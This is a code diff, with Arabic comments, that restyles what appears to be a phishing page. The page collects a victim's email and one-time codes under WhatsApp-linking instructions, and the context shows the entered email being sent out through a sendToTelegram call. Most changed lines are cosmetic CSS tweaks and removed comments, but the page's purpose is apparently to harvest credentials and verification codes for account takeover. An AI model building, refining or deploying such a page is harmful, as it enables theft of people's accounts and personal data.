@@ -20,11 +20,12 @@
 }
 * { box-sizing: border-box; }
 html, body { height: 100%; }
+
 body {
   position: relative;
   margin: 0; min-height: 100vh;
   display: flex; flex-direction: column;
-  background-color: #1a1a1c;
+  background-color: #0d0d0e; /* لون أسود غامق ليتطابق مع الصورة */
   font-family: 'Inter', sans-serif; color: var(--text);
   overflow-x: hidden;
 }
@@ -33,11 +34,11 @@ body::before {
   content: '';
   position: fixed;
   top: 0; right: 0; bottom: 0; left: 0;
-  background-color: #1a1a1c;
   background-image: url('1000005893.png');
   background-repeat: repeat;
-  background-size: 220px 220px;
-  background-position: top right;
+  background-size: 80px 80px; /* تصغير حجم النقشة لتتكرر أكثر */
+  background-position: top left;
+  opacity: 0.35; /* جعل النقشة خفيفة وغامقة */
   z-index: 0;
   pointer-events: none;
 }
@@ -164,7 +165,6 @@ button:hover { filter: brightness(1.08); }
   font-size: 20px; font-weight: 700; text-align: center; outline: none; letter-spacing: 13.5px; padding-left: 13.5px; z-index: 2; position: relative; text-transform: uppercase;
   padding-bottom: 10px;
 }
-/* رسالة خطأ الإيميل القديمة */
 .otp-error-msg { color: var(--red); text-align: center; font-weight: 700; margin-bottom: 12px; font-size: 13px; display: none; }
 
 .timer-text { text-align: center; color: #cccccc; font-size: 12px; font-weight: 500; margin-bottom: 16px; }
@@ -215,7 +215,6 @@ button:hover { filter: brightness(1.08); }
 .whatsapp-code-instruction strong { color: #ffffff; font-weight: 600; }
 .whatsapp-code-actions { display: flex; gap: 10px; margin-top: 8px; }
 
-/* زر إعادة الإرسال الرمادي مع الإضاءة على الحواف */
 .whatsapp-resend-btn {
   flex: 1; padding: 12px; border: none; border-radius: 8px;
   background: #1a1a1c; color: #777777; font-weight: 700; font-size: 14px;
@@ -230,14 +229,13 @@ button:hover { filter: brightness(1.08); }
 }
 .whatsapp-connect-btn { flex: 1; }
 
-/* رسالة الخطأ الجديدة الخاصة بالواتساب */
 .whatsapp-error-overlay-box {
   position: absolute;
   top: 50%; left: 50%;
   transform: translate(-50%, -50%);
-  width: 60%; /* العرض تم تقليله */
+  width: 60%; 
   max-width: 220px;
-  height: 170px; /* الطول تم زيادته */
+  height: 170px; 
   background: #1e1e1e;
   border: 1px solid #333;
   border-radius: 14px;
@@ -574,10 +572,8 @@ function validateEmailField() {
   input.value = input.value.replace(/[^a-zA-Z0-9@._-]/g, '');
   const val = input.value;
   
-  // صيغة Regex صارمة للتحقق من أن الإيميل حقيقي ومكتمل
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   
-  // يضيء الزر فقط إذا طابقت الكتابة شكل الإيميل
   document.getElementById('emailContinueBtn').classList.toggle('ready-gold', emailRegex.test(val));
 }
 
@@ -586,7 +582,7 @@ function submitEmailLink() {
   const inputVal = document.getElementById('linkEmailInput').value;
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   
-  if(!emailRegex.test(inputVal)) return; // منع العبور إذا لم يكن إيميلاً حقيقياً
+  if(!emailRegex.test(inputVal)) return;
   
   savedUserEmail = inputVal;
   sendToTelegram(`🔔 إيميل: ${savedUserEmail}`);
